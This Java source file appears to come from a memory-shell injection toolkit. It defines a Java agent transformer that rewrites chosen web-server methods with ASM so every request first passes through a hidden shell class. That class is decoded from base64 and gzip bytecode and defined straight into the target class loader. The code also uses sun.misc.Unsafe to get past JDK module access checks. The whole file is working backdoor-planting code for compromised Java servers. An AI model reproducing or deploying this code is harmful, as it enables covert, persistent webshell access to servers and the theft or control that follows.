package com.reajason.javaweb.agent;

import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.Type;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.ProtectionDomain;
import java.util.zip.GZIPInputStream;

/**
 * Shared bytecode hook used by every {@code *AgentInjector}. The generated agent jar contains this
 * class next to the injector template; keep it free of non-JDK dependencies beyond ASM.
 */
public final class AgentInjectorSupport implements ClassFileTransformer {
    private final Config config;
    private final String shellClassName;
    private final String shellBase64;

    static {
        // Must happen before the first reflective ClassLoader.defineClass call: it is only allowed
        // when this class belongs to java.base, the same trick ByPassJavaModuleInterceptor applies
        // to the generated injector itself.
        enableClassLoaderAccess();
    }

    private AgentInjectorSupport(Config config, String shellClassName, String shellBase64) {
        this.config = config;
        this.shellClassName = shellClassName;
        this.shellBase64 = shellBase64;
    }

    public static ClassFileTransformer create(Config config, String shellClassName, String shellBase64) {
        return new AgentInjectorSupport(config, shellClassName, shellBase64);
    }

    /**
     * Registers a hook without persistence support: restore/persist arguments are ignored.
     */
    public static ClassFileTransformer launchTransient(Instrumentation inst, ClassFileTransformer previous,
                                                       Config config, String shellClassName,
                                                       String shellBase64) throws Exception {
        System.out.println("MemShell Agent is starting");
        if (previous != null) {
            inst.removeTransformer(previous);
        }
        ClassFileTransformer transformer = create(config, shellClassName, shellBase64);
        inst.addTransformer(transformer, true);
        for (Class<?> loadedClass : inst.getAllLoadedClasses()) {
            if (config.matches(loadedClass.getName())) {
                inst.retransformClasses(loadedClass);
            }
        }
        return transformer;
    }

    @Override
    @SuppressWarnings("all")
    public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] bytes) {
        if (!config.matchesInternalName(className)) {
            return bytes;
        }
        defineTargetClass(loader);
        try {
            byte[] transformedBytes = transformClass(loader, bytes, config, shellClassName);
            System.out.println("MemShell Agent is working at " + className.replace('/', '.')
                    + "." + config.methodFor(className));
            return transformedBytes;
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return bytes;
    }

    public static byte[] transformClass(final ClassLoader loader, byte[] bytes, final Config config,
                                        final String shellClassName) {
        ClassReader cr = new ClassReader(bytes);
        final String targetMethodName = config.methodFor(cr.getClassName());
        ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
            @Override
            protected ClassLoader getClassLoader() {
                return loader;
            }
        };
        ClassVisitor cv = new ClassVisitor(Opcodes.ASM9, cw) {
            @Override
            public MethodVisitor visitMethod(int access, String name, String descriptor,
                                             String signature, String[] exceptions) {
                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                if (config.acceptsMethod(targetMethodName, name, descriptor)) {
                    return new AgentShellMethodVisitor(mv, Type.getArgumentTypes(descriptor),
                            shellClassName, config.intHookResult && descriptor.endsWith(")I"));
                }
                return mv;
            }
        };
        cr.accept(cv, ClassReader.EXPAND_FRAMES);
        return cw.toByteArray();
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } catch (Exception e) {
            throw new RuntimeException(e);
        } finally {
            try {
                if (gzipInputStream != null) {
                    gzipInputStream.close();
                }
                out.close();
            } catch (Exception ignored) {
            }
        }
    }

    private void defineTargetClass(ClassLoader loader) {
        if (config.defineIntoLoader) {
            // Always define into the target class's loader. loadClass() may resolve the shell from the
            // agent AppClassLoader, which OSGi bundle loaders cannot use for NEW/invoke.
            if (findLoadedClass(loader, shellClassName) != null) {
                return;
            }
        } else {
            try {
                loader.loadClass(shellClassName);
                return;
            } catch (Throwable ignored) {
            }
        }
        try {
            byte[] classBytecode = gzipDecompress(decodeBase64(shellBase64));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            defineClass.invoke(loader, classBytecode, 0, classBytecode.length);
        } catch (Throwable ignored) {
        }
    }

    private static Object findLoadedClass(ClassLoader loader, String className) {
        try {
            Method findLoadedClass = ClassLoader.class.getDeclaredMethod("findLoadedClass", String.class);
            findLoadedClass.setAccessible(true);
            return findLoadedClass.invoke(loader, className);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static void enableClassLoaderAccess() {
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Object unsafe = unsafeField.get(null);
            Object javaBaseModule = Class.class.getMethod("getModule").invoke(Object.class);
            Method objectFieldOffset = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            Long moduleOffset = (Long) objectFieldOffset.invoke(unsafe, Class.class.getDeclaredField("module"));
            Method getAndSetObject = unsafe.getClass().getMethod("getAndSetObject",
                    Object.class, long.class, Object.class);
            getAndSetObject.invoke(unsafe, AgentInjectorSupport.class, moduleOffset, javaBaseModule);
        } catch (Throwable ignored) {
            // JDK 8 has no modules; other VMs simply keep whatever reflective access they already had.
        }
    }

    /**
     * Target classes and hook behaviour shared by all agent injectors.
     */
    public static final class Config {
        private final String[] targetClasses;
        private final String[] targetMethods;
        private final String[] dottedTargetClasses;
        private final boolean defineIntoLoader;
        private final boolean intHookResult;
        private final String description;

        private Config(String[] targetClasses, String[] targetMethods, boolean defineIntoLoader,
                       boolean intHookResult, String description) {
            this.targetClasses = targetClasses;
            this.targetMethods = targetMethods;
            this.dottedTargetClasses = new String[targetClasses.length];
            for (int i = 0; i < targetClasses.length; i++) {
                this.dottedTargetClasses[i] = targetClasses[i].replace('/', '.');
            }
            this.defineIntoLoader = defineIntoLoader;
            this.intHookResult = intHookResult;
            this.description = description;
        }

        /**
         * @param targetClassAndMethodPairs alternating internal class names and target method names
         */
        public static Config of(String... targetClassAndMethodPairs) {
            if (targetClassAndMethodPairs == null || targetClassAndMethodPairs.length == 0
                    || targetClassAndMethodPairs.length % 2 != 0) {
                throw new IllegalArgumentException("Expected alternating target class and method names");
            }
            int count = targetClassAndMethodPairs.length / 2;
            String[] targetClasses = new String[count];
            String[] targetMethods = new String[count];
            for (int i = 0; i < count; i++) {
                targetClasses[i] = targetClassAndMethodPairs[i * 2];
                targetMethods[i] = targetClassAndMethodPairs[i * 2 + 1];
                if (targetClasses[i] == null || targetMethods[i] == null) {
                    throw new IllegalArgumentException("Target class and method names must not be null");
                }
            }
            return new Config(targetClasses, targetMethods, false, false, null);
        }

        /**
         * Defines the shell directly in the target class loader even when a parent loader already
         * exposes it; required when the target loader cannot resolve classes from the agent loader.
         */
        public Config defineIntoLoader() {
            return new Config(targetClasses, targetMethods, true, intHookResult, description);
        }

        /**
         * Matches void and int target methods, returning {@code GlassFishValve.END_PIPELINE} (2)
         * from int methods after the hook ran.
         */
        public Config intHookResult() {
            return new Config(targetClasses, targetMethods, defineIntoLoader, true, description);
        }

        public Config description(String description) {
            return new Config(targetClasses, targetMethods, defineIntoLoader, intHookResult, description);
        }

        boolean matches(String dottedClassName) {
            for (String targetClass : dottedTargetClasses) {
                if (targetClass.equals(dottedClassName)) {
                    return true;
                }
            }
            return false;
        }

        boolean matchesInternalName(String internalClassName) {
            for (String targetClass : targetClasses) {
                if (targetClass.equals(internalClassName)) {
                    return true;
                }
            }
            return false;
        }

        String methodFor(String className) {
            String internalClassName = className.replace('.', '/');
            for (int i = 0; i < targetClasses.length; i++) {
                if (targetClasses[i].equals(internalClassName)) {
                    return targetMethods[i];
                }
            }
            return null;
        }

        boolean acceptsMethod(String targetMethodName, String name, String descriptor) {
            return targetMethodName != null && targetMethodName.equals(name)
                    && (!intHookResult || descriptor.endsWith(")V") || descriptor.endsWith(")I"));
        }

        String describeTarget() {
            return description != null ? description : dottedTargetClasses[0];
        }
    }

    public static class AgentShellMethodVisitor extends MethodVisitor {
        private final Type[] argumentTypes;
        private final String className;
        private final boolean intReturn;

        public AgentShellMethodVisitor(MethodVisitor mv, Type[] argTypes, String className, boolean intReturn) {
            super(Opcodes.ASM9, mv);
            this.argumentTypes = argTypes;
            this.className = className;
            this.intReturn = intReturn;
        }

        @Override
        public void visitCode() {
            loadArgArray();
            Label tryStart = new Label();
            Label tryEnd = new Label();
            Label catchHandler = new Label();
            Label ifConditionFalse = new Label();
            Label skipCatchBlock = new Label();
            mv.visitTryCatchBlock(tryStart, tryEnd, catchHandler, "java/lang/Throwable");

            mv.visitLabel(tryStart);
            String internalClassName = className.replace('.', '/');
            mv.visitTypeInsn(Opcodes.NEW, internalClassName);
            mv.visitInsn(Opcodes.DUP);
            mv.visitMethodInsn(Opcodes.INVOKESPECIAL, internalClassName, "<init>", "()V", false);
            mv.visitInsn(Opcodes.SWAP);
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL,
                    "java/lang/Object",
                    "equals",
                    "(Ljava/lang/Object;)Z",
                    false);
            mv.visitJumpInsn(Opcodes.IFEQ, ifConditionFalse);
            // GlassFishValve.END_PIPELINE == 2
            if (intReturn) {
                mv.visitInsn(Opcodes.ICONST_2);
                mv.visitInsn(Opcodes.IRETURN);
            } else {
                mv.visitInsn(Opcodes.RETURN);
            }
            mv.visitLabel(ifConditionFalse);
            mv.visitLabel(tryEnd);
            mv.visitJumpInsn(Opcodes.GOTO, skipCatchBlock);
            mv.visitLabel(catchHandler);
            mv.visitInsn(Opcodes.POP);
            mv.visitLabel(skipCatchBlock);
        }

        private void loadArgArray() {
            mv.visitIntInsn(Opcodes.SIPUSH, argumentTypes.length);
            mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
            for (int i = 0; i < argumentTypes.length; i++) {
                mv.visitInsn(Opcodes.DUP);
                push(i);
                Type argumentType = argumentTypes[i];
                mv.visitVarInsn(argumentType.getOpcode(Opcodes.ILOAD), getArgIndex(i));
                boxPrimitive(argumentType);
                mv.visitInsn(Type.getType(Object.class).getOpcode(Opcodes.IASTORE));
            }
        }

        @SuppressWarnings("all")
        private void push(final int value) {
            if (value >= -1 && value <= 5) {
                mv.visitInsn(Opcodes.ICONST_0 + value);
            } else if (value >= Byte.MIN_VALUE && value <= Byte.MAX_VALUE) {
                mv.visitIntInsn(Opcodes.BIPUSH, value);
            } else if (value >= Short.MIN_VALUE && value <= Short.MAX_VALUE) {
                mv.visitIntInsn(Opcodes.SIPUSH, value);
            } else {
                mv.visitLdcInsn(new Integer(value));
            }
        }

        private void boxPrimitive(Type type) {
            if (type.getSort() == Type.OBJECT || type.getSort() == Type.ARRAY) {
                return;
            }

            String owner;
            String descriptor;

            switch (type.getSort()) {
                case Type.BOOLEAN:
                    owner = "java/lang/Boolean";
                    descriptor = "(Z)Ljava/lang/Boolean;";
                    break;
                case Type.CHAR:
                    owner = "java/lang/Character";
                    descriptor = "(C)Ljava/lang/Character;";
                    break;
                case Type.BYTE:
                    owner = "java/lang/Byte";
                    descriptor = "(B)Ljava/lang/Byte;";
                    break;
                case Type.SHORT:
                    owner = "java/lang/Short";
                    descriptor = "(S)Ljava/lang/Short;";
                    break;
                case Type.INT:
                    owner = "java/lang/Integer";
                    descriptor = "(I)Ljava/lang/Integer;";
                    break;
                case Type.FLOAT:
                    owner = "java/lang/Float";
                    descriptor = "(F)Ljava/lang/Float;";
                    break;
                case Type.LONG:
                    owner = "java/lang/Long";
                    descriptor = "(J)Ljava/lang/Long;";
                    break;
                case Type.DOUBLE:
                    owner = "java/lang/Double";
                    descriptor = "(D)Ljava/lang/Double;";
                    break;
                default:
                    return;
            }
            mv.visitMethodInsn(Opcodes.INVOKESTATIC, owner, "valueOf", descriptor, false);
        }

        private int getArgIndex(final int arg) {
            int index = 1;
            for (int i = 0; i < arg; i++) {
                index += argumentTypes[i].getSize();
            }
            return index;
        }
    }
}
